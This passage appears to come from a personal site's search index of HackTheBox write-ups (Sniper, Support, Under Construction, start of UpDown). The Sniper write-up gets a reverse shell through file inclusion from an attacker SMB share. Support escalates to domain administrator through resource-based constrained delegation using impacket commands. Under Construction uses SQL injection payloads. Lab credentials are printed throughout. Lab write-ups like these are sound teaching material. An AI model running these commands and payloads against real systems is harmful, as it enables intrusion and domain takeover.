<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ feroxbuster -u http://10.10.10.151 -w Wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.7.1\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://10.10.10.151\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 Wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n \ud83d\udc4c  Status Codes          \u2502 [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.7.1\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udcb2  Extensions            \u2502 [php]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n301      GET        2l       10w      148c http://10.10.10.151/blog =&gt; http://10.10.10.151/blog/\n301      GET        2l       10w      150c http://10.10.10.151/images =&gt; http://10.10.10.151/images/\n200      GET       87l      214w     2635c http://10.10.10.151/\n200      GET       87l      214w     2635c http://10.10.10.151/index.php\n301      GET        2l       10w      148c http://10.10.10.151/user =&gt; http://10.10.10.151/user/\n301      GET        2l       10w      155c http://10.10.10.151/user/images =&gt; http://10.10.10.151/user/images/\n200      GET      229l      586w     5704c http://10.10.10.151/blog/index.php\n302      GET        0l        0w        0c http://10.10.10.151/user/index.php =&gt; login.php\n200      GET      107l      202w     5456c http://10.10.10.151/user/login.php\n301      GET        2l       10w      161c http://10.10.10.151/user/images/icons =&gt; http://10.10.10.151/user/images/icons/\n200      GET      112l      231w     5922c http://10.10.10.151/user/registration.php\n301      GET        2l       10w      147c http://10.10.10.151/css =&gt; http://10.10.10.151/css/\n301      GET        2l       10w      152c http://10.10.10.151/blog/css =&gt; http://10.10.10.151/blog/css/\n301      GET        2l       10w      152c http://10.10.10.151/user/css =&gt; http://10.10.10.151/user/css/\n301      GET        2l       10w      146c http://10.10.10.151/js =&gt; http://10.10.10.151/js/\n301      GET        2l       10w      151c http://10.10.10.151/blog/js =&gt; http://10.10.10.151/blog/js/\n200      GET        0l        0w        0c http://10.10.10.151/user/db.php\n301      GET        2l       10w      151c http://10.10.10.151/user/js =&gt; http://10.10.10.151/user/js/\n302      GET        1l        0w        3c http://10.10.10.151/user/logout.php =&gt; login.php\n301      GET        2l       10w      155c http://10.10.10.151/user/vendor =&gt; http://10.10.10.151/user/vendor/\n302      GET        0l        0w        0c http://10.10.10.151/user/auth.php =&gt; login.php\n301      GET        2l       10w      154c http://10.10.10.151/user/fonts =&gt; http://10.10.10.151/user/fonts/\n301      GET        2l       10w      165c http://10.10.10.151/user/vendor/bootstrap =&gt; http://10.10.10.151/user/vendor/bootstrap/\n301      GET        2l       10w      169c http://10.10.10.151/user/vendor/bootstrap/css =&gt; http://10.10.10.151/user/vendor/bootstrap/css/\n301      GET        2l       10w      168c http://10.10.10.151/user/vendor/bootstrap/js =&gt; http://10.10.10.151/user/vendor/bootstrap/js/\n301      GET        2l       10w      162c http://10.10.10.151/user/vendor/jquery =&gt; http://10.10.10.151/user/vendor/jquery/\n301      GET        2l       10w      163c http://10.10.10.151/user/vendor/animate =&gt; http://10.10.10.151/user/vendor/animate/\n</code></pre> <p>The page has something called User Portal that ask for login but also let you sign up. When registering in the page, the portal is under construction so nothing interesting. The blog part has something worth our time, check this URL: http://10.10.10.151/blog/index.php?lang=blog-en.php, maybe it is vulnerable to LFI. Checking for the <code>c:\\Windows\\win.ini</code> I got the contents with this: <code>view-source:http://10.10.10.151/blog/?lang=\\windows\\win.ini</code>.</p>"},{"location":"HackTheBox/Sniper/#getting-rce","title":"Getting RCE","text":"<p>Looks like we have no permissions to check the ISS logs for RCE and the service is filtering HTTP URLs to get RFI. The thing is that the server allows SMB URLs! So I got a PHP reverse shell and, hosting a Samba server, I made the server execute it: <code>http://10.10.10.151/blog/?lang=//10.10.14.4/public/shell.php</code>.</p> <p>Using SMB for hosting payloads was new for me but worked like a charm and now I have a reverse shell.</p>"},{"location":"HackTheBox/Sniper/#pwned","title":"Pwned!","text":"<p>I found the credentials for the database in the website PHP files:</p> <pre><code>&lt;?php\n// Enter your Host, username, password, database below.\n// I left password empty because i do not set password on localhost.\n$con = mysqli_connect(\"localhost\",\"dbuser\",\"36mEAhz/B8xQ~2VM\",\"sniper\");\n// Check connection\nif (mysqli_connect_errno())\n  {\n  echo \"Failed to connect to MySQL: \" . mysqli_connect_error();\n  }\n?&gt;\n</code></pre> <p>Using Crackmapexec I saw that the password is valid for the Chris user. The thing is that I also found this:</p> <pre><code>PS C:\\&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name                  SID                                                          \n========================== =============================================================\niis apppool\\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                           Type             SID          Attributes                                        \n==================================== ================ ============ ==================================================\nMandatory Label\\High Mandatory Level Label            S-1-16-12288                                                   \nEveryone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nBUILTIN\\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group\nLOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group\n                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre> <p>The <code>SeImpersonatePrivilege</code> if enabled for our current user, this means that maybe we can use something like PrintSpoofer to escalate to  <code>nt authority\\system</code>. There is a AV in place but using my SMB share I was able to execute it without problems:</p> <pre><code>C:\\inetpub\\wwwroot\\blog&gt;\\\\10.10.14.4\\public\\PrintSpoofer64.exe -i -c cmd\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.17763.678]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nnt authority\\system\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>Look at that! We pwned the machine. Checking some other writeups, looks like this was not the intended way of getting full privileges but it is always fun to find alternative paths.</p>"},{"location":"HackTheBox/Support/","title":"Support","text":""},{"location":"HackTheBox/Support/#nmap","title":"Nmap","text":"<p>Let's start as always with a Nmap scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1500 -p- -Pn 10.10.11.174                                              \n[sudo] password for kali: \nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 05:33 EST\nNmap scan report for 10.10.11.174\nHost is up (0.056s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49667/tcp open  unknown\n49674/tcp open  unknown\n49686/tcp open  unknown\n49700/tcp open  unknown\n55676/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 87.51 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.11.174\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 05:36 EST\nNmap scan report for 10.10.11.174\nHost is up (0.053s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-24 10:36:43Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp open  mc-nmf        .NET Message Framing\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-11-24T10:36:51\n|_  start_date: N/A\n|_clock-skew: 3s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.23 seconds\n</code></pre> <p>First I will try to enumerate the SMB service and then start looking around AD and Kerberos.</p>"},{"location":"HackTheBox/Support/#smb","title":"SMB","text":"<p>Enumerating the SMB service I found these shares available:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ crackmapexec smb 10.10.11.174 -u guest -p '' --shares\nSMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.174    445    DC               [+] support.htb\\guest: \nSMB         10.10.11.174    445    DC               [+] Enumerated shares\nSMB         10.10.11.174    445    DC               Share           Permissions     Remark\nSMB         10.10.11.174    445    DC               -----           -----------     ------\nSMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin\nSMB         10.10.11.174    445    DC               C$                              Default share\nSMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC\nSMB         10.10.11.174    445    DC               NETLOGON                        Logon server share \nSMB         10.10.11.174    445    DC               support-tools   READ            support staff tools\nSMB         10.10.11.174    445    DC               SYSVOL                          Logon server share\n</code></pre> <p>In the <code>support-tools</code> share I found something interesting. Apart from all the portable programs in there, there was a file called <code>UserInfo.exe.zip</code>. From it, I extracted a binary and a bunch DLLs. I decided to try to reverse it since it really looks like something custom made.</p>"},{"location":"HackTheBox/Support/#getting-user","title":"Getting user","text":"<p>I moved to my Windows box and discovered that it is a .NET binary so I can get the code for it pretty easily with ILSpy. Looking around the binary code I found this class:</p> <pre><code>// UserInfo.Services.Protected\nusing System;\nusing System.Text;\n\ninternal class Protected\n{\n    private static string enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\";\n\n    private static byte[] key = Encoding.ASCII.GetBytes(\"armando\");\n\n    public static string getPassword()\n    {\n        byte[] array = Convert.FromBase64String(enc_password);\n        byte[] array2 = array;\n        for (int i = 0; i &lt; array.Length; i++)\n        {\n            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);\n        }\n        return Encoding.Default.GetString(array2);\n    }\n}\n</code></pre> <p>Executing the funtion gives the password: <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>. One thing to note is that this password is for the user: <code>support\\ldap</code> according with the part of the code that actually use this class. I tested the credentials with <code>crackmapexec</code> and they are valid!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Support/support-tools-share]\n\u2514\u2500$ crackmapexec ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'        \nSMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.174    389    DC               [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\n</code></pre> <p>After looking around I found something when enumerating users:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Support/support-tools-share]\n\u2514\u2500$ ldapsearch -x -H ldap://10.10.11.174 -D 'support\\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"CN=Users,DC=support,DC=htb\"\n...\n\n# Protected Users, Users, support.htb\ndn: CN=Protected Users,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: group\ncn: Protected Users\ndescription: Members of this group are afforded additional protections against\n  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=\n 298939 for more information.\n...\ninfo: Ironside47pleasure40Watchful\n...\n</code></pre> <p>That field <code>info</code> really looks like a password, let's try it out:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Support]\n\u2514\u2500$ crackmapexec winrm 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'\nSMB         10.10.11.174    5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)\nHTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman\nWINRM       10.10.11.174    5985   DC               [+] support.htb\\support:Ironside47pleasure40Watchful (Pwn3d!)\n</code></pre> <p>Cool, now we can just get a shell with <code>evil-winrm</code> and start playing with the machine.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Support]\n\u2514\u2500$ evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'\n\nEvil-WinRM shell v3.4\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; whoami\nsupport\\support\n</code></pre>"},{"location":"HackTheBox/Support/#privilege-escalation","title":"Privilege escalation","text":"<p>After a bit, I decided to upload the Bloodhound collector to start searching for AD privilege escalation vectors. This is what I found:</p> <p></p> <p>As you can see, the group <code>Shared Support Accounts</code> has full privileges over the <code>DC.SUPPORT.HTB</code> machine, and we are part of that group! This means we can try to escalate abusing constrained delegation. You can read more about it here.</p>"},{"location":"HackTheBox/Support/#check-prerequisites","title":"Check prerequisites","text":"<p>First things first, lets check we meet all the requirements for the attack:</p> <ul> <li>Our user can create computers:     <pre><code>*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Get-DomainObject -Identity \"dc=support,dc=htb\" -Domain support.htb\n\n...\nms-ds-machineaccountquota                   : 10\n...\n</code></pre></li> <li>At least Windows Server 2012     <pre><code>*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Get-DomainController\n\n...\nOSVersion                  : Windows Server 2022 Standard\nRoles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}\nDomain                     : support.htb\n...\n</code></pre></li> <li>Flag <code>msds-allowedtoactonbehalfofotheridentity</code> not set     <pre><code>*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity\n\nname msds-allowedtoactonbehalfofotheridentity\n---- ----------------------------------------\nDC\n</code></pre></li> </ul>"},{"location":"HackTheBox/Support/#time-to-pwn","title":"Time to pwn!","text":"<p>Since we meet all the requirements we can start the attack, let's create a new Machine Accound:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose\nVerbose: [+] Domain Controller = dc.support.htb\nVerbose: [+] Domain = support.htb\nVerbose: [+] SAMAccountName = FAKE01$\nVerbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb\n[+] Machine account FAKE01 added\n\n*Evil-WinRM* PS C:\\Users\\support\\Documents&gt; Get-DomainComputer fake01\n\npwdlastset             : 11/24/2022 9:00:23 AM\nlogoncount             : 0\nbadpasswordtime        : 12/31/1600 4:00:00 PM\ndistinguishedname      : CN=FAKE01,CN=Computers,DC=support,DC=htb\nobjectclass            : {top, person, organizationalPerson, user...}\nname                   : FAKE01\nobjectsid              : S-1-5-21-1677581083-3380853377-188903654-5101\nsamaccountname         : FAKE01$\nlocalpolicyflags       : 0\ncodepage               : 0\nsamaccounttype         : MACHINE_ACCOUNT\naccountexpires         : NEVER\ncountrycode            : 0\nwhenchanged            : 11/24/2022 5:00:23 PM\ninstancetype           : 4\nusncreated             : 82112\nobjectguid             : 40f08ed8-491c-4569-b5c8-be4b747a46b7\nlastlogon              : 12/31/1600 4:00:00 PM\nlastlogoff             : 12/31/1600 4:00:00 PM\nobjectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb\ndscorepropagationdata  : 1/1/1601 12:00:00 AM\nserviceprincipalname   : {RestrictedKrbHost/FAKE01, HOST/FAKE01, RestrictedKrbHost/FAKE01.support.htb, HOST/FAKE01.support.htb}\nms-ds-creatorsid       : {1, 5, 0, 0...}\nbadpwdcount            : 0\ncn                     : FAKE01\nuseraccountcontrol     : WORKSTATION_TRUST_ACCOUNT\nwhencreated            : 11/24/2022 5:00:23 PM\nprimarygroupid         : 515\niscriticalsystemobject : False\nusnchanged             : 82114\ndnshostname            : FAKE01.support.htb\n</code></pre> <p>Basically we have created a fake computer that is part of the domain and we have full control over it. Now we have to create a security descriptor for the victim machine <code>msds-allowedtoactonbehalfofotheridentity</code> flag, note the machine account SID because we will need it for this (<code>S-1-5-21-1677581083-3380853377-188903654-5101</code>):</p> <pre><code>*Evil-WinRM* PS C:\\Users\\support&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)\"\n\n*Evil-WinRM* PS C:\\Users\\support&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)\n\n*Evil-WinRM* PS C:\\Users\\support&gt; (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $SDBytes, 0).DiscretionaryAcl\n\n\nBinaryLength       : 36\nAceQualifier       : AccessAllowed\nIsCallback         : False\nOpaqueLength       : 0\nAccessMask         : 983551\nSecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5101\nAceType            : AccessAllowed\nAceFlags           : None\nIsInherited        : False\nInheritanceFlags   : None\nPropagationFlags   : None\nAuditFlags         : None\n\n*Evil-WinRM* PS C:\\Users\\support&gt; $SD.GetBinaryForm($SDBytes, 0)\n\n*Evil-WinRM* PS C:\\Users\\support&gt; Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose\nVerbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb\nVerbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'\nVerbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb\nVerbose: [Get-DomainObject] Get-DomainObject filter string: (&amp;(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))\nVerbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 237 19 0 0' for object 'DC$'\n</code></pre> <p>We can check that the flag is properly set with this command:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\support&gt; Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'\n\nmsds-allowedtoactonbehalfofotheridentity\n----------------------------------------\n{1, 0, 4, 128...}\n</code></pre> <p>With all the changes we made, our fake computer account is allowed to impersonate any user in the victim machine. We can escalate our privileges by impersonating the Administrator account using Impacket to generate a Kerberos Service Ticket on behalf of the Administrator using our fake machine account:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ impacket-getST support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn cifs/dc.support.htb\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*]     Requesting S4U2self\n[*]     Requesting S4U2Proxy\n[*] Saving ticket in administrator.ccache\n</code></pre> <p>Nice, we have the ticket. Now we can use it with <code>impacket-wmiexec</code> to get a shell to the domain controller as domain administrator!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ export KRB5CCNAME=administrator.ccache\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\&gt;whoami\nsupport\\administrator\n</code></pre>"},{"location":"HackTheBox/Under_Construction/","title":"Under Construction","text":""},{"location":"HackTheBox/Under_Construction/#static-analysis","title":"Static analysis","text":"<p>The challenge gives the webpage files so i started checking the code. In the <code>\u00ecndex.js</code> file we can see the diferent paths we have: <code>/</code>, <code>/auth</code> and <code>/logout</code>. Everything looks right here so the next thing we can check is the <code>AuthMiddleware</code> that is what make sure if a user is logged in and who the user is.</p> <p>The middleware is checking the cookies for a JWT token that will be decoded using the <code>JWTHelper</code> and if the token is right, the application will take the user name from the decoded token and check it in the database using the <code>DBHelper</code>. If the user exists the application sends the user to the index and if not it sends an error message. If the the token is incorrect or missing, the application responds with an error or redirecting to the login page respectively.</p> <p>Let's talk about the helpers. Look's like the <code>JWTHelper</code> just contains functions to sign and verify/decode JWT tokens, the thing is that in the <code>decode</code> function the application is allowing the <code>HS256</code>, a symmetric algorithm, to verify the JWT. This means that we can sign tokens using the public key if we specify <code>HS256</code> as the algorithm (JWT confusion attack). About the <code>DBHelper</code>, it is mostly ok but for the <code>getUser</code> function because it is vulnerable to SQL injection. This function is called with the username contained in the JWT token to check if the user exists so we can enumerate the database.</p>"},{"location":"HackTheBox/Under_Construction/#attack","title":"Attack","text":"<p>I wrote a Python script that generate the JWTs with a SQL injection payload, sends the tokens and parse the responses to make my life easier. We also know that the databse is SQLite (We know what payloads to use).</p> <p>First to get the tables we can use: <pre><code>' OR 1=2 UNION SELECT 1, group_concat(tbl_name), 3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -\n\nResult --&gt; flag_storage,users\n</code></pre></p> <p>Cool the <code>flag_storage</code> table looks promising let's enumerate it:</p> <pre><code>' OR 1=2 UNION select 1,group_concat(name),3 from pragma_table_info('flag_storage') -- -\n\nResult --&gt; id,top_secret_flaag\n</code></pre> <p>Now we can just get the flag with:</p> <pre><code>' OR 1=2 UNION select 1,group_concat(top_secret_flaag),3 from flag_storage -- -\n</code></pre>"},{"location":"HackTheBox/UpDown/","title":"UpDown","text":""},{"location":"HackTheBox/UpDown/#nmap","title":"Nmap","text":"<p>An Nmap scan reveals that the server only have SSH and Apache running. I will take a look to Apache first since the SSH version looks more or less updated.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap 10.10.11.177 -p- --min-rate=1000\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:19 EDT\nNmap scan report for 10.10.11.177\nHost is up (0.053s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 18.72 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p22,80 10.10.11.177\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:21 EDT\nNmap scan report for 10.10.11.177\nHost is up (0.047s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)\n|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)\n|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Is my Website up ?\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.57 seconds\n</code></pre>"},{"location":"HackTheBox/UpDown/#port-80","title":"Port 80","text":""},{"location":"HackTheBox/UpDown/#enumerating","title":"Enumerating","text":"<p>A page to check if a site is up or not. I can see the domain for the site so I will add it to my host file: <code>siteisup.htb</code> just in case.</p> <p>The application is maybe using CURL or something similar to check for sites status according with the information the de debug mode shows. I will launch a directory scan just in case I can find something more, looks like the server is using PHP files so I will look for them in the scan too:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ feroxbuster -u http://siteisup.htb/ -w Wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher \ud83e\udd13                 ver: 2.7.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://siteisup.htb/\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 Wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n \ud83d\udc4c  Status Codes          \u2502 [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.7.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udcb2  Extensions            \u2502 [php]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n \ud83c\udf89  New Version Available \u2502 